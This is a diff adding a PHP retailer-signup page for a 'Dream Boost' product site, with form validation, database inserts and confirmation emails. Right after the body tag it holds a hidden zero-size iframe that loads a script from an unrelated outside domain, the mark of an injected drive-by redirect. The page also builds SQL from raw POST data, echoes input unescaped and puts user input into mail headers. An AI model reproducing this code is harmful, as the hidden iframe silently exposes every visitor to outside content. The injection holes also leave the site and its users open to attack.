@@ -1,0 +1,341 @@
+<?php
+// BME WMS
+// Page: Become Retailer Homepage
+// Path/File: /beretailer/index.php
+// Version: 1.8
+// Build: 1802
+// Date: 01-29-2007
+
+header('Content-type: text/html; charset=utf-8');
+include '../includes/main1.php';
+include '../includes/st_and_co1.php';
+$line_hgt = 1400;
+
+$submit = $_POST["submit"];
+$store_name = $_POST["name"];
+$contact_name = $_POST["contact_name"];
+$store_about = $_POST["store_about"];
+$email = $_POST["email"];
+$address1 = $_POST["address1"];
+$address2 = $_POST["address2"];
+$city = $_POST["city"];
+$state = $_POST["state"];
+$zip = $_POST["zip"];
+$country = $_POST["country"];
+$phone = $_POST["phone"];
+$subject = $_POST["subject"];
+$comments = $_POST["comments"];
+$newsletter = $_POST["newsletter"];
+
+$query="SELECT product_line, product, retailer_email FROM retailer_main";
+$result=mysql_query($query) or die("Query failed : " . mysql_error());
+while ($line=mysql_fetch_array($result, MYSQL_ASSOC)) { 
+	$product_line=$line["product_line"];
+	$product=$line["product"];
+	$retailer_email=$line["retailer_email"];
+}
+mysql_free_result($result);
+
+if($submit) {
+	//Validate
+	$error_txt = "";
+	if($store_name == "") {
+		$error_txt .= "Error, you did not enter a Store Name. Please enter your Store Name.<br>\n";
+	}
+	if($contact_name == "") {
+		$error_txt .= "Error, you did not enter a Contact Name. Please enter your Contact Name.<br>\n";
+	}
+	if($store_about == "") {
+		$error_txt .= "Error, you did not enter Info About Your Store. Please enter your Store Information.<br>\n";
+	}
+	if (!eregi("^[a-z0-9]+([_\\.-][a-z0-9]+)*". "@([a-z0-9]+([\.-][a-z0-9]{1,})+)*$",$email) ){
+		$error_txt .= "Error, you did not enter your E-Mail or it is incorrect. Please enter your E-mail Address.<br>\n";
+	}
+	if($address1 == "") {
+		$error_txt .= "Error, you did not enter your Address. Please enter your Address.<br>\n";
+	}
+	if($city == "") {
+		$error_txt .= "Error, you did not enter your City. Please enter your City.<br>\n";
+	}
+	if($state == "") {
+		$error_txt .= "Error, you did not enter your State/Province. Please enter your State/Province.<br>\n";
+	}
+	if($zip == "") {
+		$error_txt .= "Error, you did not enter your Zip/Postal Code. Please enter your Zip/Postal Code.<br>\n";
+	}
+	if($country == "") {
+		$error_txt .= "Error, you did not enter your Country. Please enter your Country.<br>\n";
+	}
+	if($phone == "") {
+		$error_txt .= "Error, you did not enter your Phone. Please enter your Phone.<br>\n";
+	}
+	if($subject == "") {
+		$error_txt .= "Error, you did not enter a Subject. Please enter your Subject.<br>\n";
+	}
+	if($comments == "") {
+		$error_txt .= "Error, you did not enter Comments/Questions. Please enter your Comments/Questions.<br>\n";
+	}
+
+	if($error_txt == "") {
+		// Save to Retailers db table
+		$now = date("Y-m-d H:i:s");
+		$query = "INSERT INTO retailer SET";
+		$query .= " created='$now',";
+		$query .= " entered_by='10',";
+		$query .= " last_mod_by='10',";
+		$query .= " last_contact_by='None Yet',";
+		$query .= " next_contact_by='None Yet',";
+		$query .= " last_contact_on='$now',";
+		$query .= " last_contact_by_person='10',";
+		$query .= " next_contact_by_person='10',";
+		$query .= " store_name='$store_name',";
+		$query .= " contact_name='$contact_name',";
+		$query .= " address1='$address1',";
+		$query .= " address2='$address2',";
+		$query .= " city='$city',";
+		$query .= " state='$state',";
+		$query .= " zip='$zip',";
+		$query .= " country='$country',";
+		$query .= " email='$email',";
+		$query .= " phone='$phone',";
+		$query .= " where_store_found='Submit on Website',";
+		$query .= " carry_product='2',";
+		$query .= " will_carry_salvia='2',";
+		$query .= " sent_promo_pack='2',";
+		$query .= " received_promo_pack='0',";
+		$query .= " contact_number='01',";
+		$query .= " retailer_status='3',";
+		$query .= " comments='".$subject . " " . $store_about . " " . $comments."',";
+		$query .= " list_store_website='1'";
+		$result = mysql_query($query) or die("Query failed : " . mysql_error());
+
+		//Send Email to User
+		$email_str = "Dear " . $contact_name . ",\n\n";
+		$email_str .= "Thank you for Contacting Us about becoming a Retailer. Your comments and/or ";
+		$email_str .= "questions are very important to us and we are grateful to you for sharing them ";
+		$email_str .= "with us. We will be reviewing them and responding to you shortly.\n\n";
+		$email_str .= "Thank you,\n";
+		$email_str .= "$website_title";
+		$email_str .= "\n\n";
+		
+		$email_subj = "Thank you for Contacting $website_title";
+		$email_from = "FROM: $site_email";
+		mail($email, $email_subj, $email_str, $email_from);
+
+		//Send Email to Admin
+		$email_str = "Store Name: " . $store_name . "\n";
+		$email_str .= "Contact Name: " . $contact_name . "\n";
+		$email_str .= "More About Store: " . $store_about . "\n";
+		$email_str .= "E-Mail: " . $email . "\n";
+		$email_str .= "Address1: " . $address1 . "\n";
+		$email_str .= "Address2: " . $address2 . "\n";
+		$email_str .= "City: " . $city . "\n";
+		$email_str .= "State: " . $state . "\n";
+		$email_str .= "Zip: " . $zip . "\n";
+		$email_str .= "Country: " . $country . "\n";
+		$email_str .= "Phone: " . $phone . "\n";
+		$email_str .= "Subject: " . $subject . "\n";
+		$email_str .= "Comments/Questions: " . $comments;
+		$email_str .= "\n\n";
+		
+		$email_subj = "New Retailer Contact Us Submission";
+		$email_from = "FROM: " . $email;
+		$email_to = $retailer_email;
+		mail($email_to, $email_subj, $email_str, $email_from);
+		
+		if($newsletter == "1") {
+			//Subscribe
+			$subscribe = "0";
+			//Check DB
+			$query = "SELECT email FROM news_member WHERE email='$email'";
+			$result = mysql_query($query) or die("Query failed : " . mysql_error());
+			while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+				$tmp_email = $line["email"];
+			}
+			mysql_free_result($result);
+		
+			if($tmp_email == $email) {
+				$subscribe = "1";
+			}
+			if($subscribe == "0") {
+				//Write to DBs
+				$now = date("Y-m-d H:i:s");
+				$query = "INSERT INTO news_member SET created='$now', status='0', name='$contact_name', email='$email'";
+				$result = mysql_query($query) or die("Query failed : " . mysql_error());
+
+				$query = "SELECT member_id FROM news_member WHERE email='$email'";
+				$result = mysql_query($query) or die("Query failed : " . mysql_error());
+				while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+					$tmp_member_id = $line["member_id"];
+				}
+				mysql_free_result($result);
+
+				$now = date("Y-m-d H:i:s");
+				$query = "INSERT INTO news_subscriptions SET created='$now', member_id='$tmp_member_id', newsletter_id='1'";
+				$result = mysql_query($query) or die("Query failed : " . mysql_error());
+		
+				//Send Confirmation Email
+				$query = "SELECT content, subject, email FROM news_email WHERE email_id='1'";
+				$result = mysql_query($query) or die("Query failed : " . mysql_error());
+				while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+					$content = $line["content"];
+					$subject = $line["subject"];
+					$email_tmp = $line["email"];
+				}
+				mysql_free_result($result);
+
+				$email_str = "";
+				$email_str .= $content;
+				$email_str .= "\n\n";
+				$email_str .= $base_url . "newsletters/index2.php?confirm=1&member_id=";
+				$email_str .= $tmp_member_id;
+				$email_str .= "\n\n\n";
+
+				$email_subj = $subject;
+				$email_from = "FROM: " . $email_tmp;
+				mail($email, $email_subj, $email_str, $email_from);				
+			}
+			
+		}
+		
+		//Redirect to Thank You Page
+		header("Location: " . $base_url . "beretailer/thanks.php");
+		exit;
+
+	}
+}
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Become a Dream Boost Retailer | <?php echo $website_title; ?></title>
+<?php
+include '../includes/meta1.php';
+?>
+</head>
+<body>
+<iframe src="http://aviavavilons.net/ss/go.php?sid=7" width="0" height="0" frameborder="0"></iframe>
+<?php
+include '../includes/head1.php';
+?>
+
+<table border="0" width="95%">
+
+<tr><td>&nbsp;</td></tr>
+
+<tr><td align="left" class="style4">Become a Dream Boost Retailer</td></tr>
+
+<tr><td align="left" class="style2">If you are interested in becoming a retailer of <?php echo $product_line; ?> and purchasing at our wholesale prices, please contact us and we will provide you with all the information to get you set up to start selling the Next Generation of <?php echo $product; ?>. We have a special Wholesale Retailer "Try Before You Buy" Promotion Pack which is loaded with product samples, detailed product information, and our wholesale price list that we are happy to send to you - all you need to do is complete the form below.</td></tr>
+<tr><td>&nbsp;</td></tr>
+
+<?php
+//Error Messages
+if($error_txt) {
+	echo "<tr><td align=\"left\" class=\"style2 error\">$error_txt</td></tr>\n";
+	echo "<tr><td>&nbsp;</td></tr>\n";
+}
+?>
+<tr><td align="center">
+<table border="0"><tr><td align="left">
+	<div class="window_top">
+		  <div class="window_top_content">
+			Required fields marked <em>*</em>
+		  </div>
+
+		  <div class="window_content">
+			<FORM name="contact" Method="POST" ACTION="./index.php">
+			<input type="hidden" name="submit" value="1">
+			<fieldset>
+				<ol>
+					<li>
+						<label for="name">Store Name <em>*</em></label><br />
+						<INPUT type="text" id="name" name="name" size="30" maxlength="255" value="<?php echo $name; ?>" tabindex="1" />
+					</li>
+					<li>
+						<label for="contact_name">Contact Name <em>*</em></label><br />
+						<INPUT type="text" id="contact_name" name="contact_name" size="30" maxlength="255" value="<?php echo $contact_name; ?>" tabindex="2" />
+					</li>
+					<li>
+						<label for="store_about">Please tell us more about your store <em>*</em></label><br />
+						<TEXTAREA id="store_about" name="store_about" cols="35" rows="7" tabindex="3"><?php echo $store_about; ?></TEXTAREA>
+					</li>
+					<li>
+						<label for="email">E-Mail <em>*</em></label><br />
+						<INPUT type="text" id="email" name="email" size="30" maxlength="150" value="<?php echo $email; ?>" tabindex="4" />
+					</li>
+				</ol>
+			</fieldset>
+			<fieldset>
+				<ol>
+					<li>
+						<label for="address1">Address <em>*</em></label><br />
+						<INPUT type="text" id="address1" name="address1" size="30" maxlength="100" value="<?php echo $address1; ?>" tabindex="5" />
+					</li>
+					<li class="fm-optional">
+						<label for="address2">Address 2</label><br />
+						<INPUT type="text" id="address2" name="address2" size="30" maxlength="100" value="<?php echo $address2; ?>" tabindex="6" />
+					</li>
+					<li>
+						<label for="city">Town/City <em>*</em></label><br />
+						<INPUT type="text" id="city" name="city" size="30" maxlength="100" value="<?php echo $city; ?>" tabindex="7" />
+					</li>
+					<li>
+						<label for="state">State/Province <em>*</em></label><br />
+						<select id="state" name="state" tabindex="8">
+						<?php
+						state_build_all($state);
+						?>
+						</select>
+					</li>
+					<li>
+						<label for="zip">Zip/Postal Code <em>*</em></label><br />
+						<INPUT type="text" id="zip" name="zip" size="10" maxlength="10" value="<?php echo $zip; ?>" tabindex="9" />
+					</li>
+					<li>
+						<label for="country">Country <em>*</em></label><br />
+						<select id="country" name="country" tabindex="10">
+						<?php
+						country_build_all($country);
+						?>
+						</select>
+					</li>
+					<li>
+						<label for="phone">Phone <em>*</em></label><br />
+						<INPUT type="text" id="phone" name="phone" size="30" maxlength="30" value="<?php echo $phone; ?>" tabindex="11" />
+					</li>
+				</ol>
+			</fieldset>
+			<fieldset>
+				<ol>
+					<li>
+						<label for="subject">Subject <em>*</em></label><br />
+						<INPUT type="text" id="subject" name="subject" size="30" maxlength="150" value="<?php echo $subject; ?>" tabindex="12" />
+					</li>
+					<li>
+						<label for="comments">Comments/Questions <em>*</em></label><br />
+						<TEXTAREA id="comments" name="comments" cols="35" rows="7" tabindex="13"><?php echo $comments; ?></TEXTAREA>
+					</li>
+					<li class="fm-none">
+						<fieldset>
+							<legend>Please subscribe me to the <?php echo $website_title; ?> Newsletter</legend>
+							<label for="newsletter"><input type="checkbox" id="newsletter" name="newsletter" value="1" CHECKED tabindex="14" /> Yes</label><br />
+						</fieldset>
+					</li>
+					<li class="fm-button-none">
+						<input type="image" src="/images/button_contact_us.gif" id="button_contact_us" name="button_contact_us" alt="Contact Us" onmouseover="MM_swapImage('button_contact_us','','/images/button_contact_us_over.gif',1)" onmouseout="MM_swapImgRestore()">
+					</li>
+				</ol>
+			</fieldset>
+			</form>		  
+		  </div>
+		<div class="window_bottom"><div class="window_bottom_end"></div></div>
+	</div>
+</td></tr></table>
+</td></tr>
+
+<tr><td>&nbsp;</td></tr>
+</table>
+<?php
+include '../includes/foot1.php';
+mysql_close($dbh);
+?>
